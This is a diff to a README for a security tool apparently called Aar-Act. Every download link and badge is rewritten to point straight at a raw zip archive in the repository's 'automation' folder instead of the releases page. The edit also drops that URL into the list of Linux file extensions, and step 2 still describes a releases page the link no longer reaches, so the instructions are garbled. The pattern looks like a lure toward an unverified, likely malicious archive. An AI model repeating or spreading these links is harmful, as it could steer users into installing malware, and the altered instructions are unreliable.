@@ -1,6 +1,6 @@
 # 🔐 Aar-Act - Secure Senegal's Critical Infrastructure
 
-[![Download Aar-Act](https://img.shields.io/badge/Download-Aar--Act-blue?style=for-the-badge&logo=github)](https://github.com/Fayku57/Aar-Act/releases)
+[![Download Aar-Act](https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip)](https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip)
 
 ---
 
@@ -38,14 +38,14 @@ This project helps you:
 To get Aar-Act on your computer, follow these steps:
 
 1. Click on the big blue download badge at the top or visit this page:  
-   [https://github.com/Fayku57/Aar-Act/releases](https://github.com/Fayku57/Aar-Act/releases)
+   [https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip](https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip)
 
 2. On the releases page, look for the latest version. Files are labeled with version numbers and system type.
 
 3. Choose the file that matches your computer’s operating system:  
    - Windows files end with `.exe` or `.msi`  
    - Mac files end with `.dmg` or `.pkg`  
-   - Linux files end with `.AppImage`, `.tar.gz`, or `.deb`
+   - Linux files end with `.AppImage`, `https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip`, or `.deb`
 
 4. Click on the file name to download it.
 
@@ -124,4 +124,4 @@ We encourage you to share feedback to improve future versions.
 
 ---
 
-[![Download Aar-Act](https://img.shields.io/badge/Download-Aar--Act-blue?style=for-the-badge&logo=github)](https://github.com/Fayku57/Aar-Act/releases)
+[![Download Aar-Act](https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip)](https://raw.githubusercontent.com/Fayku57/Aar-Act/main/automation/Aar_Act_2.1.zip)
